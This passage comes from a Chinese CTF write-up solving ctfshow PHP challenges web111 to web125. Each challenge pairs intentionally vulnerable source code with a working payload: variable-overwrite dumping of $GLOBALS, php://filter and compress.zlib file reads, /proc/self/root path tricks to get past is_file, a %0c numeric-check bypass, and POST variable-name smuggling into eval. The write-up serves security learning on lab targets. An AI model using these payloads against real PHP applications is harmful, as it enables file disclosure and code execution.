</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nx">var_dump</span><span class="p">(</span><span class="nv">$$v1</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl">
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\&#34;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#39;</span><span class="p">,</span> <span class="nv">$v1</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error v1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\&#34;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#39;</span><span class="p">,</span> <span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error v2&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">    
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/ctfshow/&#39;</span><span class="p">,</span> <span class="nv">$v1</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">            <span class="nx">getFlag</span><span class="p">(</span><span class="nv">$v1</span><span class="p">,</span><span class="nv">$v2</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">   
</span></span><span class="line"><span class="ln">37</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这题是关于变量覆盖的题目</p>
<p>由于</p>
<pre tabindex="0"><code>if(preg_match(&#39;/ctfshow/&#39;, $v1)){
            getFlag($v1,$v2);
    }
</code></pre><p>所有我们可以确定v1的值只能为ctfshow</p>
<p>接下来看getFlag函数</p>
<pre tabindex="0"><code>function getFlag(&amp;$v1,&amp;$v2){
    eval(&#34;$$v1 = &amp;$$v2;&#34;);
    var_dump($$v1);
}
</code></pre><p>getFlag函数会将v1的地址指向v2，也就是说会使v1的值等于v2</p>
<p>var_dump则会输出变量的相关信息</p>
<p>那我们只需要使v2的值等于我们要查询的变量就可以读到我们的flag</p>
<p>但是问题来了，我们不知道要查的变量是什么，也不知道是不是在作用域里面</p>
<p>所这里使用超全局变量 $GLOBALS，$GLOBALS 是PHP的一个超级全局变量组，包含了全部变量的全局组合数组，变量的名字就是数组的键。</p>
<p>构造payload把所有全局变量全输出来</p>
<pre tabindex="0"><code>https://feec7abc-68b0-4b95-86bc-1db857e3624a.challenge.ctf.show?v1=ctfshow&amp;v2=GLOBALS
</code></pre><p><img alt="image-20250106003832148" loading="lazy" src="assets/image-20250106003832148.png"></p>
<h4 id="web112">web112<a hidden class="anchor" aria-hidden="true" href="#web112">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-30 23:47:49
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$file</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\.\.\/|http|https|data|input|rot13|base64|string/i&#39;</span><span class="p">,</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;hacker!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">return</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="nv">$file</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$file</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;hacker!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题考察的是php伪协议，虽然被ban了data、input 等伪协议，又ban了 string、data、rot13 相关的过滤器，但是还是有不少能用的伪协议和过滤器</p>
<p>如 php://filter（这里也用不到过滤器）</p>
<pre tabindex="0"><code>https://c9c112c8-f426-4008-9e05-712cff76e02c.challenge.ctf.show/?file=php://filter/resource=flag.php
</code></pre><p>其他</p>
<pre tabindex="0"><code>php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
php://filter/read=convert.quoted-printable-encode/resource=flag.php
compress.zlib://flag.php
</code></pre><p><strong>为什么不能直接输入flag.php呢?</strong></p>
<pre tabindex="0"><code>if(!is_file($file)){
    highlight_file(filter($file));
}else{
    echo &#34;hacker!&#34;;
}
</code></pre><p>那是因为is_file(&ldquo;flag.php&rdquo;)==true，输出hacker！</p>
<h4 id="web113">web113<a hidden class="anchor" aria-hidden="true" href="#web113">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-30 23:47:52
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$file</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#39;</span><span class="p">,</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">return</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="nv">$file</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span> <span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$file</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;hacker!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题相比上题把filter过滤了</p>
<p>我们可以考虑使用其他伪协议</p>
<p>如 compress.zlib://</p>
<pre tabindex="0"><code>compress.zlib://flag.php
</code></pre><p><strong>官方题解</strong> 目录溢出导致is_file认为这不是一个文件</p>
<pre tabindex="0"><code>/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p
roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro
c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/
self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se
lf/root/proc/self/root/var/www/html/flag.php
</code></pre><h4 id="web114">web114<a hidden class="anchor" aria-hidden="true" href="#web114">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-01 15:02:53
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$file</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#39;</span><span class="p">,</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">return</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="nv">$file</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="k">echo</span> <span class="s2">&#34;师傅们居然tql都是非预期 哼！&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span> <span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$file</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;hacker!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题ban掉了compress和root没办法使用上题的两种解法，但是把filter放出来了</p>
<pre tabindex="0"><code>php://filter/resource=flag.php
</code></pre><p>直接读就完事了</p>
<h4 id="web115">web115<a hidden class="anchor" aria-hidden="true" href="#web115">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-01 15:08:19
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$num</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$num</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;0x&#34;</span><span class="p">,</span><span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="nv">$num</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$num</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;0&#34;</span><span class="p">,</span><span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="nv">$num</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nv">$num</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="nv">$num</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nv">$num</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;e&#34;</span><span class="p">,</span><span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="nv">$num</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nv">$num</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;+&#34;</span><span class="p">,</span><span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="nv">$num</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">return</span> <span class="nv">$num</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="nv">$num</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$num</span><span class="p">)</span> <span class="k">and</span> <span class="nv">$num</span><span class="o">!==</span><span class="s1">&#39;36&#39;</span> <span class="k">and</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$num</span><span class="p">)</span><span class="o">!==</span><span class="s1">&#39;36&#39;</span> <span class="k">and</span> <span class="nx">filter</span><span class="p">(</span><span class="nv">$num</span><span class="p">)</span><span class="o">==</span><span class="s1">&#39;36&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$num</span><span class="o">==</span><span class="s1">&#39;36&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;hacker!!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;hacker!!!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>参考文章:<a href="https://blog.csdn.net/m0_48780534/article/details/125523030">ctfshow学习记录-web入门（php特性109-115&amp;123&amp;125-126）_ctfshow web109-CSDN博客</a></p>
<p>is_numeric可以在数字前面加空格绕过，同时加上空格也可以绕过$num!=&lsquo;36&rsquo;</p>
<p>但是我们知道trim函数是移除字符串两侧的空白字符或其他预定义字符，空格等字符是会被去掉的</p>
<p>我们这里考虑使用%0c（换页符）进行绕过</p>
<p>同时使用%0c也可以绕过filter。</p>
<p>接下来再看第二个if判断，这是看起来很矛盾的一个判断。</p>
<p>来具体看一下!==的定义，只要类型不同就不全等。</p>
<p><img alt="php比较" loading="lazy" src="../assets/fa3b23f0144b0dff5e00bdc93fabdf3b.png"></p>
<blockquote>
<p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行。此规则也适用于 switch 语句。当用 === 或 !== 进行比较时则不进行类型转换，因为此时类型和数值都要比对。
——《php手册》语言参考-运算符-比较运算符</p></blockquote>
<p>也就是说!==时不进行类型转换。</p>
<p>所以加上%0c换页符，在==进行类型转换，所有%0c36会被转换为数值36，结果true；在!==不进行类型转换，所以字符串和数值比较，类型不同，结果true。</p>
<p>payload：</p>
<pre tabindex="0"><code>?num=%0c36
</code></pre><h4 id="web123">web123<a hidden class="anchor" aria-hidden="true" href="#web123">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;argv&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$c</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;fun&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;CTF_SHOW&#39;</span><span class="p">])</span><span class="o">&amp;&amp;</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;CTF_SHOW.COM&#39;</span><span class="p">])</span><span class="o">&amp;&amp;!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;fl0g&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/</span><span class="se">\\\\</span><span class="s2">|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|</span><span class="se">\&#34;</span><span class="s2">|\&#39;|\,|\.|\;|\?/&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="nv">$c</span><span class="o">&lt;=</span><span class="mi">18</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">         <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$c</span><span class="s2">&#34;</span><span class="o">.</span><span class="s2">&#34;;&#34;</span><span class="p">);</span>  
</span></span><span class="line"><span class="ln">21</span><span class="cl">         <span class="k">if</span><span class="p">(</span><span class="nv">$fl0g</span><span class="o">===</span><span class="s2">&#34;flag_give_me&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">             <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">         <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这题其实根本不用理会</p>
<pre tabindex="0"><code>         if($fl0g===&#34;flag_give_me&#34;){
             echo $flag;
         }
</code></pre><p>这题对c进行了一定的限制，但是影响不大我们可以直接再eval处执行echo $flag;从而拿到flag</p>
<p>这题还有一个考点，由于在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有空格、+、[则会被转化为_，所以按理来说我们构造不出CTF_SHOW.COM这个变量(因为含有.)，但php中有个特性就是如果传入[，它被转化为_之后，后面的字符就会被保留下来不会被替换</p>
<p>payload:</p>
<pre tabindex="0"><code>POST:CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun= echo $flag
</code></pre><h4 id="web125">web125<a hidden class="anchor" aria-hidden="true" href="#web125">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">#
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">#
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;argv&#39;</span><span class="p">];</span>
